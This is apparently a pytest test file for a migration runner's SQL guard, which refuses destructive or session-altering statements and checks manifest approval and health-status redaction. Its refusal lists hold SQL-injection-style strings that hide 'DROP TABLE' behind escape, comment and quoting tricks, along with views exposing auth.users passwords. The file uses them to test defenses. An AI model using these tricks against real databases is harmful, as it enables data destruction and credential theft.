    ("DO $$ BEGIN IF true THEN ALTER PUBLICATION p ADD TABLE zz; END IF; END $$;", "ALTER PUBLICATION"),
    ("ALTER DATABASE postgres SET statement_timeout = 0;", "ALTER DATABASE"),
    ("ALTER ROLE authenticator SET search_path = '';", "ALTER ROLE"),
    ("CREATE VIEW zz_v AS SELECT id, email FROM auth.users;", "view over the auth schema"),
    ("CREATE OR REPLACE VIEW public.zz_v AS SELECT u.email FROM zz JOIN \"auth\".users u USING (id);", "view over the auth schema"),
    ("CREATE MATERIALIZED VIEW zz_v AS SELECT encrypted_password FROM auth . users;", "view over the auth schema"),
    ("SELECT pg_sleep(600);", "pg_sleep"),
    ("DO $$ BEGIN PERFORM pg_catalog.pg_sleep_for('10 minutes'); END $$;", "pg_sleep"),
    # the tricks that make a naive reader think live SQL is inside a string or a comment
    ("SELECT E'\\''; DROP TABLE trades; --';", "DROP TABLE"),
    ("SELECT e'a'\n  '\\''; DROP TABLE trades; --';", "DROP TABLE"),
    ("SELECT '\\'; DROP TABLE trades; --';", "DROP TABLE"),
    ("SELECT 'it''s'; DROP TABLE trades;", "DROP TABLE"),
    ("SELECT 1; -- to the server this comment ends at a carriage return\rDROP TABLE trades;", "DROP TABLE"),
    ("SELECT E'a' -- a comment does not end the continuation\n '\\''; DROP TABLE trades; --';", "DROP TABLE"),
    ("SELECT e'a'\r'\\''; DROP TABLE trades; --';", "DROP TABLE"),
    ("/* a /* nested */ comment */ DROP TABLE trades;", "DROP TABLE"),
    ("SELECT $a$ $$ $a$; DROP TABLE trades; SELECT $$ x $$;", "DROP TABLE"),
    ("SELECT 1; -- it's fine\nDROP TABLE trades;", "DROP TABLE"),
    ('SELECT 1 AS "a""b"; DROP TABLE trades;', "DROP TABLE"),
]


@pytest.mark.parametrize("sql, rule", REFUSED)
def test_guard_refuses_each_keyword(sql, rule):
    assert migrate.guard(sql) == rule
    assert migrate.guard(sql, frozenset({"destructive"})) is None            # the owner approved exactly this


ALLOWED = [
    OK_SQL,
    "-- DROP TABLE trades; TRUNCATE; DELETE FROM x; GRANT ALL ON t TO anon; COPY\nCREATE TABLE zz (id int); ALTER TABLE zz ENABLE ROW LEVEL SECURITY;",
    "/* DROP TABLE trades;\n   DISABLE ROW LEVEL SECURITY */ CREATE TABLE zz (id int); ALTER TABLE zz ENABLE ROW LEVEL SECURITY;",
    "/* outer /* DROP TABLE a; */ still a comment: TRUNCATE b; */ CREATE TABLE zz (id int); ALTER TABLE zz ENABLE ROW LEVEL SECURITY;",
    "CREATE FUNCTION zz_f() RETURNS void LANGUAGE plpgsql AS $$ BEGIN DELETE FROM zz WHERE id = 1; TRUNCATE zz; END $$;",
    "CREATE FUNCTION zz_f() RETURNS void LANGUAGE plpgsql AS $body$ BEGIN DROP TABLE zz; COMMIT; END $body$;",
    "COMMENT ON TABLE zz IS 'never DROP TABLE this; never GRANT ALL ON it TO anon; COPY that';",
    "INSERT INTO zz (note) VALUES ('it''s not a DROP TABLE'), (E'nor \\' TRUNCATE this'), ('a'\n 'DELETE FROM b');",
    "INSERT INTO zz (note) VALUES (U&'d\\0061ta DROP TABLE x'), ($q$ DISABLE ROW LEVEL SECURITY $q$);",
    "ALTER TABLE zz DROP CONSTRAINT IF EXISTS zz_check; DROP POLICY IF EXISTS p ON zz; DROP INDEX IF EXISTS ix_zz;",
    "CREATE TABLE zz (id int REFERENCES t ON DELETE CASCADE, copy_of int, truncated boolean, public_note text); ALTER TABLE zz ENABLE ROW LEVEL SECURITY;",
    "CREATE POLICY p ON zz FOR DELETE TO authenticated USING (user_id = auth.uid());",
    "GRANT SELECT ON zz TO service_role; REVOKE ALL ON zz FROM anon, authenticated, PUBLIC;",
    "CREATE TRIGGER t AFTER DELETE ON zz FOR EACH ROW EXECUTE FUNCTION zz_f();",
    "ALTER TABLE zz ENABLE ROW LEVEL SECURITY; ALTER TABLE zz FORCE ROW LEVEL SECURITY;",
    "DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_tables WHERE tablename = 'zz') THEN CREATE INDEX ix ON zz (id); END IF; END $$;",
    "SET LOCAL work_mem = '64MB'; SET CONSTRAINTS ALL DEFERRED; CREATE INDEX ix ON zz (id);",
    # what the new rules must leave alone
    "ALTER TABLE zz DROP CONSTRAINT IF EXISTS zz_check, ADD CONSTRAINT zz_check CHECK (a > 0);",
    "ALTER TABLE zz ALTER COLUMN a DROP NOT NULL, ALTER COLUMN b DROP DEFAULT;",
    "CREATE TABLE IF NOT EXISTS public.zz (id int); ALTER TABLE zz ENABLE ROW LEVEL SECURITY;",
    'CREATE TABLE "zz" (id int); ALTER TABLE IF EXISTS ONLY public.zz ADD COLUMN a int, ENABLE ROW LEVEL SECURITY;',
    "CREATE TEMP TABLE zz_work ON COMMIT DROP AS SELECT 1 AS id; UPDATE zz SET a = 1 FROM zz_work w WHERE zz.id = w.id;",
    "DO $$ BEGIN CREATE TEMPORARY TABLE w (id int) ON COMMIT DROP; UPDATE zz SET a = 1; END $$;",
    "SELECT pg_advisory_xact_lock(42); CREATE INDEX ix ON zz (id);",
    "CREATE POLICY p ON public.zz FOR SELECT TO authenticated USING (public.is_member(firm_id));",
    "CREATE VIEW zz_v WITH (security_invoker = true) AS SELECT id FROM zz;",
    "CREATE FUNCTION zz_f() RETURNS void LANGUAGE plpgsql SET search_path = public, pg_temp AS $$ BEGIN PERFORM pg_sleep(1); END $$;",
    "DO $$ BEGIN RAISE NOTICE 'Set up: copy done, it''s fine'; RAISE EXCEPTION E'two\\nlines'; END $$;",
    "DO $$ BEGIN UPDATE zz SET note = 'x' WHERE id = 1; EXECUTE 'CREATE INDEX IF NOT EXISTS ix ON zz (id)'; END $$;",
    "CREATE FUNCTION zz_f() RETURNS int LANGUAGE sql SET search_path = public AS $$ SELECT 1 $$;",
    "UPDATE zz SET note = 'x' WHERE id = 1;",
    "INSERT INTO zz (note) VALUES (E'a' -- continued in escape mode: the rest is one literal\n '\\'; DROP TABLE trades; --');",
    "INSERT INTO zz (id, note) VALUES (1, 'it''s') ON CONFLICT (id) DO UPDATE SET note = 'it''s not a DROP TABLE';",
    "DO $$ BEGIN RAISE NOTICE 'it''s done'; INSERT INTO zz (id) VALUES (1) ON CONFLICT (id) DO NOTHING; END $$;",
]


@pytest.mark.parametrize("sql", ALLOWED)
def test_guard_does_not_trigger_inside_comments_strings_or_stored_bodies(sql):
    assert migrate.guard(sql) is None


ALWAYS = [
    ("BEGIN;\nALTER TABLE zz ADD COLUMN a int;\nCOMMIT;", "transaction control"),
    ("CREATE TABLE zz (id int); COMMIT; DROP TABLE trades;", "transaction control"),
    ("CREATE TABLE zz (id int);\n  rollback ;", "transaction control"),
    ("START TRANSACTION; CREATE TABLE zz (id int);", "transaction control"),
    ("CREATE TABLE zz (id int); END;", "transaction control"),
    ("SAVEPOINT a; CREATE TABLE zz (id int);", "transaction control"),
    ("/* c */ ABORT;", "transaction control"),
    ("SET search_path = '';\nCREATE TABLE zz (id int);", "session setting"),
    ("SET SESSION statement_timeout = 0; CREATE TABLE zz (id int);", "session setting"),
    ("set role postgres; CREATE TABLE zz (id int);", "session setting"),
    ("RESET ALL; CREATE TABLE zz (id int);", "session setting"),
    ("DISCARD ALL;", "session setting"),
    ("SELECT set_config('search_path', '', false); CREATE TABLE zz (id int);", "session setting"),
    ("DO $$ BEGIN PERFORM set_config('role', 'postgres', false); END $$;", "session setting"),
    ("SELECT 'never closed;", "unparseable"),
    ("SELECT 1; /* never closed", "unparseable"),
    ("SELECT $x$ never closed;", "unparseable"),
    ('SELECT 1 AS "never closed;', "unparseable"),
    ("SELECT 1 AS a$$ ' $$; DROP TABLE trades; --';", "unparseable"),        # a$$ is an identifier to PostgreSQL
    ("SELECT 1$$ ' $$; DROP TABLE trades; --';", "unparseable"),             # and 1$$ opens a body: not guessed at
    ("DO E'BEGIN \\x44ROP TABLE trades; END';", "unparseable"),                # a DO body that has to be decoded first
    ("DO U&'BEGIN \\0044ROP TABLE trades; END';", "unparseable"),
    ("DO 'BEGIN DROP '\n'TABLE trades; END';", "unparseable"),
    ('GRANT ALL ON trades TO U&"\\0061non";', "unparseable"),                  # anon, spelled with an escape
    # Magnus's review: session state and the runner's own settings, whatever the flags
    ("DO $$ BEGIN SET search_path = x; END $$;", "session setting"),
    ("DO $$ BEGIN IF true THEN RESET ROLE; END IF; END $$;", "session setting"),
    ("DO $$ BEGIN EXECUTE 'SET statement_timeout TO 0'; END $$;", "session setting"),
    ("DO $$ BEGIN EXECUTE 'SET/**/SESSION AUTHORIZATION postgres'; END $$;", "session setting"),
    ('SELECT "set_config"(\'a\',\'b\',false);', "session setting"),
    ("SELECT pg_catalog.Set_Config ('search_path', '', false);", "session setting"),
    ("SET LOCAL statement_timeout = 0; CREATE INDEX ix ON zz (id);", "runner setting"),
    ("set local lock_timeout = '1h'; CREATE INDEX ix ON zz (id);", "runner setting"),
    ("SET LOCAL standard_conforming_strings = off; CREATE INDEX ix ON zz (id);", "runner setting"),
    ('SET LOCAL "statement_timeout" TO DEFAULT; CREATE INDEX ix ON zz (id);', "runner setting"),
    ("SET LOCAL search_path = private; CREATE TABLE zz (id int); ALTER TABLE zz ENABLE ROW LEVEL SECURITY;", "runner setting"),
    ("DO $$ BEGIN SET LOCAL statement_timeout = 0; END $$;", "runner setting"),
    ("DO $$ BEGIN EXECUTE E'DROP\\x20TABLE t'; END $$;", "unparseable"),              # would have to be decoded: refused as it is
    ("DO $$ BEGIN EXECUTE U&'\\0044ROP TABLE t'; END $$;", "unparseable"),
    ("DO $$ BEGIN EXECUTE 'DROP '\n'TABLE t'; END $$;", "unparseable"),
    ("DO $$ BEGIN EXECUTE 'EXECUTE E''DROP\\x20TABLE t'' '; END $$;", "unparseable"),
    # Edgar's review: state that outlives the transaction on a pooled connection
    ("CREATE TEMP TABLE zz_work (id int);", migrate.TEMP_RULE),
    ("CREATE TEMPORARY TABLE zz_work (id int) ON COMMIT DELETE ROWS;", migrate.TEMP_RULE),
    ("CREATE LOCAL TEMP TABLE zz_work AS SELECT 1;", migrate.TEMP_RULE),
    ("CREATE TEMP VIEW zz_v AS SELECT 1;", migrate.TEMP_RULE),
    ("CREATE TEMP SEQUENCE zz_s;", migrate.TEMP_RULE),
    ("SELECT 1 AS id INTO TEMP zz_work;", migrate.TEMP_RULE),
    ("CREATE TABLE pg_temp.zz_work (id int);", migrate.TEMP_RULE),
    ("DO $$ BEGIN CREATE TEMP TABLE w (id int); END $$;", migrate.TEMP_RULE),
    ("PREPARE zz_p AS SELECT 1;", "PREPARE"),
    ("DO $$ BEGIN EXECUTE 'PREPARE zz_p AS SELECT 1'; END $$;", "PREPARE"),
    ("LISTEN zz_channel;", "LISTEN"),
    ("DO $$ BEGIN LISTEN zz_channel; END $$;", "LISTEN"),
    ("SELECT pg_advisory_lock(42);", "session advisory lock"),
    ("SELECT pg_try_advisory_lock_shared (1, 2);", "session advisory lock"),
    ('SELECT pg_catalog."pg_advisory_lock"(42);', "session advisory lock"),
    ("DO $$ BEGIN PERFORM pg_advisory_lock(42); END $$;", "session advisory lock"),
    ("DECLARE zz_c CURSOR WITH HOLD FOR SELECT 1;", "cursor WITH HOLD"),
    ("-- only a comment\n", "no statements"),
    ("", "no statements"),
    (" ;;\n; ", "no statements"),
]


@pytest.mark.parametrize("sql, rule", ALWAYS)
def test_guard_refuses_these_whatever_the_flags(sql, rule):
    assert migrate.guard(sql) == rule
    assert migrate.guard(sql, frozenset({"destructive"})) == rule


def test_scan_reads_statements_the_way_the_server_would():
    got = migrate.scan("create table a (x text default 'a;b'); -- c;\nDO $$ begin drop table b; end $$;\nselect 1")
    assert got == [("CREATE TABLE A (X TEXT DEFAULT '')", True), ("DO $$", True), ("BEGIN DROP TABLE B", False), ("END", False), ("SELECT 1", True)]
    assert migrate.statement_count(OK_SQL) == 2
    assert migrate.scan('SELECT 1 AS "do"; SELECT $$ DROP TABLE a $$; SELECT done FROM $$ DROP TABLE a $$;') == [
        ('SELECT 1 AS "DO"', True), ("SELECT $$", True), ("SELECT DONE FROM $$", True)]      # only a statement that starts with DO runs its body
    for e in (migrate.ManifestError("line 9: the file is listed twice"), *(migrate.ManifestError(f"line 1: {w}") for w in (
            "expected a file name, a sha256 and flags (or -), then the approval", "the file name is not YYYY-MM-DD_name.sql in lower case",
            "the sha256 is not 64 lower-case hex characters", "unknown flag", "no approval recorded (who, when, their words)"))):
        assert migrate._REASON_RE.match(str(e))                              # every manifest message is publishable as written


def test_the_reader_is_linear_in_the_size_of_the_file():
    import time
    big = "INSERT INTO zz (a, b) VALUES\n" + ",\n".join(f"  ('row {i}', 'it''s {i}')" for i in range(20_000)) + ";\n"
    assert 500_000 < len(big) < migrate.MAX_BYTES
    t0 = time.perf_counter()
    assert migrate.guard(big) is None and migrate.statement_count(big) == 1
    assert time.perf_counter() - t0 < 10


def test_every_migration_in_the_repository_is_readable_and_the_refusals_are_the_known_ones():
    """The guard run over the real files: nothing is unparseable. Two files applied by hand before the runner
    existed are refused as written: one carries its own BEGIN/COMMIT, one adds a table to the realtime
    publication (which needs the flag). The files waiting for approval pass without the flag."""
    refused = {}
    for p in sorted(migrate.ORIGINALS_DIR.glob("*.sql")):
        rule = migrate.guard(p.read_text(encoding="utf-8"))
        assert rule != "unparseable", p.name
        if rule:
            refused[p.name] = rule
    assert refused.pop("2026-11-02_trades_structure.sql") == "transaction control"
    assert refused.pop("2026-11-02_trades_realtime.sql") == "ALTER PUBLICATION"
    assert migrate.guard((migrate.ORIGINALS_DIR / "2026-11-02_trades_realtime.sql").read_text(), frozenset({"destructive"})) is None
    for pending in ("2026-11-10_fixings.sql", "2026-11-09_signup_role.sql", "2026-11-05_collateral.sql", "2026-11-05_ipv.sql", "2026-11-03_jobs.sql"):
        assert (migrate.ORIGINALS_DIR / pending).is_file() and pending not in refused, (pending, refused.get(pending))


def test_the_runner_refuses_a_hosted_database_outside_the_deployed_api(tmp_path, on, monkeypatch, caplog):
    """RIJEKA_MIGRATE=1 uvicorn main:app in a developer's shell: the .env names the hosted database."""
    from types import SimpleNamespace
    m, d = book(tmp_path, {A: OK_SQL})
    hosts = ("aws-1-us-east-1.pooler.supabase.com", "db.abcdefghijkl.supabase.co", "DB.ABCDEFGHIJKL.SUPABASE.CO")
    for host in hosts:
        conn = FakeConn()
        engine = engine_for(conn)
        engine.url = SimpleNamespace(host=host)
        with caplog.at_level(logging.DEBUG):
            out = migrate.run(engine, m, d)
        assert out["problems"] == {"database": "refused: hosted database outside the deployed API"} == {"database": migrate.HOSTED}
        assert out["applied"] == [] and out["pending"] == [A]
        assert engine.raw_connection.call_count == 0 and conn.calls == []    # not even a connection
        assert "supabase" not in json.dumps(out).lower() + json.dumps(migrate.status(m)).lower() + caplog.text.lower()
    # a real SQLAlchemy URL, password and all: the same answer and nothing of it published
    from sqlalchemy.engine import make_url
    engine = engine_for(FakeConn())
    engine.url = make_url("postgresql://postgres.ref:hunter2@aws-1-us-east-1.pooler.supabase.com:6543/postgres")
    out = migrate.run(engine, m, d)
    assert out["problems"] == {"database": migrate.HOSTED} and engine.raw_connection.call_count == 0
    assert "hunter2" not in json.dumps(out) and "pooler" not in json.dumps(out)
    # the deployed API (RENDER set) is where the hosted database is migrated
    monkeypatch.setenv("RENDER", "true")
    conn = FakeConn()
    engine = engine_for(conn)
    engine.url = make_url("postgresql://postgres.ref:hunter2@aws-1-us-east-1.pooler.supabase.com:6543/postgres")
    assert migrate.run(engine, m, d)["applied"] == [A]
    # a self-hosted deployment with its own PostgreSQL and RIJEKA_MIGRATE=1 runs
    monkeypatch.delenv("RENDER")
    for own in ("postgresql://rijeka:pw@db:5432/rijeka", "postgresql:///rijeka_test", "postgresql://u:p@pg.internal.example.org/rijeka"):
        conn = FakeConn()
        engine = engine_for(conn)
        engine.url = make_url(own)
        out = migrate.run(engine, m, d)
        assert out["applied"] == [A] and out["problems"] == {}, own


def test_public_summary_is_counts_only(tmp_path, on):
    files = {A: OK_SQL, B: "DROP TABLE zz_secret_marker;\n", C: OK_SQL.replace("zz_a", "zz_c")}
    m, d = book(tmp_path, files)
    assert migrate.public_summary(m) == {"enabled": True, "approved": 3, "applied": 0, "pending": 3, "problems": 0, "last_run": None}
    out = migrate.run(engine_for(FakeConn()), m, d)
    assert out["applied"] == [A] and out["problems"] == {B: "refused: DROP TABLE", C: migrate.BLOCKED}
    summary = migrate.public_summary(m)
    assert summary == {"enabled": True, "approved": 3, "applied": 1, "pending": 2, "problems": 2, "last_run": out["last_run"]}
    assert list(summary) == ["enabled", "approved", "applied", "pending", "problems", "last_run"]
    assert all(isinstance(summary[k], int) and not isinstance(summary[k], bool) for k in ("approved", "applied", "pending", "problems"))
    text_ = json.dumps(summary)
    assert ".sql" not in text_ and "2099" not in text_ and "refused" not in text_ and "DROP" not in text_ and "blocked" not in text_
    m.write_text("nonsense\n")                                               # a broken manifest: still counts, never raises
    assert migrate.public_summary(m) == {"enabled": True, "approved": 0, "applied": 0, "pending": 0, "problems": 1, "last_run": out["last_run"]}
    assert set(migrate.public_summary()) == set(summary)                     # the real manifest, the same shape


def test_the_words_health_shows_for_each_outcome(tmp_path, on):
    """The release checklist quotes these."""
    class Failed(Exception):
        pgcode = "42P07"
    files = {A: OK_SQL, B: OK_SQL.replace("zz_a", "zz_b"), C: OK_SQL.replace("zz_a", "zz_c")}
    m, d = book(tmp_path, files)
    seen = {A: sha(OK_SQL)}

    out = migrate.run(engine_for(FakeConn(ledger=seen)), m, d)
    assert out["applied"] == [A, B, C] and out["pending"] == [] and out["problems"] == {}                    # applied
    out = migrate.run(engine_for(FakeConn(ledger=seen, lock=False)), m, d)
    assert out["pending"] == [B, C] and out["problems"] == {"run": "busy: another instance is applying"}     # pending, busy
    (d / B).unlink()
    out = migrate.run(engine_for(FakeConn(ledger=seen)), m, d)
    assert out["problems"] == {B: "missing", C: "blocked: an earlier migration did not apply"}               # missing, blocked
    (d / B).write_text(files[B] + "-- edited\n")
    assert migrate.run(engine_for(FakeConn(ledger=seen)), m, d)["problems"][B] == "mismatch"                 # mismatch
    (d / B).write_text(files[B])
    out = migrate.run(engine_for(FakeConn(ledger={A: "f" * 64})), m, d)
    assert out["problems"] == {A: "changed"} and out["applied"] == [B, C]                                    # changed
    out = migrate.run(engine_for(FakeConn(ledger=seen, fail={"zz_b": Failed("x")})), m, d)
    assert out["problems"] == {B: "failed: Failed 42P07", C: "blocked: an earlier migration did not apply"}  # failed
    m, d = book(tmp_path, {A: OK_SQL, B: "TRUNCATE zz_b;\n"})
    assert migrate.run(engine_for(FakeConn()), m, d)["problems"] == {B: "refused: TRUNCATE"}                 # refused


def test_a_refused_file_is_not_executed_and_the_flag_lets_it_through(tmp_path, on):
    drop = "DROP TABLE IF EXISTS zz_old;\n"
    m, d = book(tmp_path, {A: drop, B: OK_SQL})
    conn = FakeConn()
    out = migrate.run(engine_for(conn), m, d)
    assert out["problems"] == {A: "refused: DROP TABLE", B: migrate.BLOCKED} and out["applied"] == []
    assert drop not in conn.sql() and "COMMIT" not in conn.calls and migrate.LOCK_TRY not in conn.sql()

    m, d = book(tmp_path, {A: drop, B: OK_SQL}, flags={A: "destructive"})
    conn = FakeConn()
    out = migrate.run(engine_for(conn), m, d)
    assert out["applied"] == [A, B] and out["problems"] == {} and drop in conn.sql()

    begin = "BEGIN;\nCREATE TABLE zz (id int);\nCOMMIT;\n"                   # the flag does not buy a COMMIT inside the file
    m, d = book(tmp_path, {A: begin}, flags={A: "destructive"})
    conn = FakeConn()
    out = migrate.run(engine_for(conn), m, d)
    assert out["problems"] == {A: "refused: transaction control"} and begin not in conn.sql()


def test_a_file_that_is_not_text_or_too_large_is_refused(tmp_path, on):
    m, d = book(tmp_path, {A: OK_SQL, B: OK_SQL})
    (d / A).write_bytes(b"\xff\xfeCREATE")
    big = b"-- pad\n" * (migrate.MAX_BYTES // 7 + 1) + OK_SQL.encode()
    (d / B).write_bytes(big)
    m.write_text(f"{A}  {hashlib.sha256((d / A).read_bytes()).hexdigest()}  -  {APPROVAL}\n{B}  {hashlib.sha256(big).hexdigest()}  -  {APPROVAL}\n")
    entries = migrate.manifest(m)
    assert migrate.preflight(entries[0], d)[0] == "refused: not UTF-8"
    assert migrate.preflight(entries[1], d)[0] == "refused: too large"
    with pytest.raises(ValueError):
        migrate._read("../../.env", d)                                       # only a manifest-shaped name is ever opened


# ── the tooling, the hook, the health body, the worker ───────────────────────────────────────────

@pytest.fixture
def repo(tmp_path, monkeypatch):
    """A stand-in repository: docs/migrations with two originals, an empty db/approved, an empty manifest."""
    originals, approved, m = tmp_path / "docs" / "migrations", tmp_path / "backend" / "db" / "approved", tmp_path / "approved.txt"
    originals.mkdir(parents=True)
    approved.mkdir(parents=True)
    (approved / "README.md").write_text("what this directory is\n")
    (originals / A).write_text(OK_SQL)
    (originals / B).write_text("DROP TABLE zz;\n")
    m.write_text("# header\n")
    monkeypatch.setattr(migrate, "MANIFEST", m)
    monkeypatch.setattr(migrate, "APPROVED_DIR", approved)
    monkeypatch.setattr(migrate, "ORIGINALS_DIR", originals)
    monkeypatch.setitem(__import__("sys").modules, "db.session", None)       # importing it would be an error: the CLI never does
    return originals, approved, m


def test_cli_hash_reads_the_original_and_writes_nothing(repo, capsys):
    originals, approved, m = repo
    assert migrate.main(["--hash", A]) == 0
    assert capsys.readouterr().out == f"{A}  {sha(OK_SQL)}  -\n"
    assert migrate.main(["--hash", B]) == 0
    out = capsys.readouterr()
    assert out.out.startswith(f"{B}  ") and "DROP TABLE" in out.err          # the coordinator is told the flag will be needed
    assert migrate.main(["--hash", "../../backend/.env"]) == 1 and migrate.main(["--hash", C]) == 1
    assert [p.name for p in approved.iterdir()] == ["README.md"] and m.read_text() == "# header\n"


def test_cli_stage_copies_the_bytes_prints_the_line_and_never_overwrites_other_bytes(repo, capsys):
    originals, approved, m = repo
    assert migrate.main(["--stage", A]) == 0
    out = capsys.readouterr()
    assert out.out == f"{A}  {sha(OK_SQL)}  -\n" and "who approved" in out.err
    assert (approved / A).read_bytes() == (originals / A).read_bytes()
    assert m.read_text() == "# header\n"                                     # the approval is written by a person, not here
    assert migrate.main(["--stage", A]) == 0                                 # the same bytes again: nothing to do
    assert capsys.readouterr().out == f"{A}  {sha(OK_SQL)}  -\n"
    (originals / A).write_text(OK_SQL + "ALTER TABLE zz_a ADD COLUMN later int;\n")      # the original is edited after approval
    assert migrate.main(["--stage", A]) == 1
    out = capsys.readouterr()
    assert out.out == "" and "never edited" in out.err
    assert (approved / A).read_text() == OK_SQL                              # the approved copy is untouched
    with pytest.raises(ValueError):
        migrate.stage(A)
    assert migrate.main(["--stage", C]) == 1 and migrate.main(["--stage", "../../backend/.env"]) == 1
    assert migrate.main(["--stage", "README.md"]) == 1
    assert sorted(p.name for p in approved.iterdir()) == [A, "README.md"]
    assert migrate.main(["--stage", B]) == 0 and "DROP TABLE" in capsys.readouterr().err


def test_cli_check_reports_every_disagreement_and_exits_non_zero(repo, capsys):
    originals, approved, m = repo

    def check():
        code = migrate.main(["--check"])
        return code, capsys.readouterr().out

    assert check() == (0, "0 approved, 0 with a problem\n")
    migrate.stage(A)
    assert check() == (1, f"{A}: no manifest line\n0 approved, 1 with a problem\n")           # a file nobody approved
    m.write_text(f"# header\n{A}  {sha(OK_SQL)}  -  {APPROVAL}\n")
    assert check() == (0, "1 approved, 0 with a problem\n")
    assert migrate.check() == {}

    (originals / A).write_text(OK_SQL + "-- touched\n")                      # the original moved on
    assert check()[1].startswith(f"{A}: differs from docs/migrations\n")
    (originals / A).unlink()
    code, out = check()
    assert code == 1 and f"{A}: no original in docs/migrations" in out
    (originals / A).write_text(OK_SQL)

    (approved / A).write_text(OK_SQL + "-- edited in place\n")               # the copy was edited
    code, out = check()
    assert code == 1 and f"{A}: mismatch; differs from docs/migrations" in out
    (approved / A).unlink()
    code, out = check()
    assert code == 1 and f"{A}: missing" in out                              # a manifest line without its file
    migrate.stage(A)
    assert check()[0] == 0

    migrate.stage(B)
    m.write_text(m.read_text() + f"{B}  {sha('DROP TABLE zz;' + chr(10))}  -  {APPROVAL}\n")
    code, out = check()
    assert code == 1 and f"{B}: refused: DROP TABLE" in out                  # approved without the flag it needs
    m.write_text(m.read_text().replace(f"{sha('DROP TABLE zz;' + chr(10))}  -", f"{sha('DROP TABLE zz;' + chr(10))}  destructive"))
    assert check()[0] == 0

    (approved / "notes.txt").write_text("x")
    (approved / "2099-01-09_zz_dir.sql").mkdir()
    code, out = check()
    assert code == 1 and "notes.txt: not a migration file" in out and "2099-01-09_zz_dir.sql: not a migration file" in out
    (approved / "notes.txt").unlink()
    (approved / "2099-01-09_zz_dir.sql").rmdir()

    # the deployed service has no docs/migrations: the originals are not asked for there, the rest still is
    migrate.ORIGINALS_DIR.rename(migrate.ORIGINALS_DIR.with_name("gone"))
    assert check()[0] == 0
    m.write_text("nonsense\n")
    code, out = check()
    assert code == 1 and "manifest: line 1" in out


def test_the_module_imports_no_router_and_no_session():
    src = Path(migrate.__file__).read_text(encoding="utf-8")
    code = [line for line in src.splitlines() if line.startswith(("import ", "from ")) or line.lstrip().startswith(("import ", "from "))]
    assert not any("fastapi" in line or "api." in line or "db.session" in line or "sqlalchemy" in line or "dotenv" in line for line in code), code


def test_the_startup_hook_applies_nothing_in_a_shell_and_never_raises(monkeypatch):
    import main
    hooks = [h.__name__ for h in main.app.router.on_startup]
    assert hooks.index("_apply_approved_migrations") == 0 < hooks.index("_start_scheduler")      # before the scheduler, before everything
    ran = MagicMock()
    monkeypatch.setattr(migrate, "run", ran)
    monkeypatch.delenv("RIJEKA_MIGRATE", raising=False)
    monkeypatch.delenv("RENDER", raising=False)
    main._apply_approved_migrations()
    assert ran.call_count == 0                                               # a developer's shell, CI, the local stack
    monkeypatch.setenv("RENDER", "true")
    monkeypatch.setenv("RIJEKA_MIGRATE", "0")
    main._apply_approved_migrations()
    assert ran.call_count == 0
    monkeypatch.delenv("RIJEKA_MIGRATE")
    main._apply_approved_migrations()
    from db.session import engine
    ran.assert_called_once_with(engine)                                      # on Render: this process's own engine, the module's own paths
    ran.side_effect = RuntimeError(SECRET)
    main._apply_approved_migrations()                                        # the API starts whatever happens here


def test_the_health_body_carries_the_migration_status(monkeypatch):
    import scheduler
    from api.routes import ops
    monkeypatch.setattr(ops, "health", lambda db: {"ok": True, "checked_at": "now", "checks": {}})
    monkeypatch.setattr(ops, "worker_status", lambda db: {"present": False})
    monkeypatch.setattr(ops, "schema_status", lambda db: {})
    monkeypatch.setattr(scheduler, "status", lambda: {})
    full = {"enabled": True, "applied": ["2026-01-01_a.sql"], "pending": ["2026-01-02_b.sql"], "problems": {"2026-01-02_b.sql": "failed: InsufficientPrivilege 42501"}, "last_run": "2026-11-09T12:00:00+00:00"}
    monkeypatch.setattr(migrate, "status", lambda *a, **k: full)
    monkeypatch.setattr(migrate, "manifest", lambda *a, **k: [object(), object()])
    body = ops.ops_health(db=None)
    # the public body: counts, never a file name or a reason (a pending security fix must not be readable by name)
    assert body["migrations"] == {"enabled": True, "approved": 2, "applied": 1, "pending": 1, "problems": 1, "last_run": "2026-11-09T12:00:00+00:00"}
    assert "2026-01-02_b.sql" not in str(body) and "42501" not in str(body)
    assert {"schema", "scheduler", "worker", "version", "commit"} <= set(body)


def test_names_and_reasons_are_for_the_admin_role_only(monkeypatch):
    from fastapi import HTTPException
    from api.routes import ops
    full = {"enabled": True, "applied": [], "pending": ["2026-01-02_b.sql"], "problems": {"2026-01-02_b.sql": "mismatch"}, "last_run": None}
    monkeypatch.setattr(migrate, "status", lambda *a, **k: full)
    monkeypatch.setattr(ops, "signup_role_applied", lambda db: True)
    role = {"v": "trader"}
    monkeypatch.setattr("api.routes.me.db_role", lambda db, uid: role["v"])
    user = {"sub": "u1", "user_metadata": {"role": "admin"}}                 # what a token claims is not the role
    with pytest.raises(HTTPException) as e:
        ops.ops_migrations(db=MagicMock(), user=user)
    assert e.value.status_code == 403
    role["v"] = "admin"
    out = ops.ops_migrations(db=MagicMock(), user=user)
    assert out == {"migrations": full, "signup_role": {"applied": True, "migration": "2026-11-09_signup_role.sql"}}


def test_the_public_schema_block_does_not_name_the_sign_up_role_check():
    from api.routes import ops
    assert "signup_role" not in {row[0] for row in ops.OPTIONAL_MIGRATIONS}


def test_only_the_api_process_runs_migrations():
    """The worker shares the code, the database and RENDER with the API; it must never apply a migration. The
    one call to migrate.run in the backend is the API's start-up hook."""
    backend = Path(migrate.__file__).resolve().parents[1]
    callers = []
    for p in backend.rglob("*.py"):
        rel = p.relative_to(backend).as_posix()
        if rel.startswith((".venv/", "venv/", "tests/")) or rel == "db/migrate.py":
            continue
        src = p.read_text(encoding="utf-8", errors="ignore")
        if "migrate.run(" in src or "from db.migrate import" in src:
            callers.append(rel)
    assert callers == ["main.py"]
    for name in ("worker.py", "scheduler.py", "jobs/handlers.py", "jobs/queue.py"):
        src = (backend / name).read_text(encoding="utf-8")
        assert "migrate" not in src and "import main" not in src and "from main" not in src, name
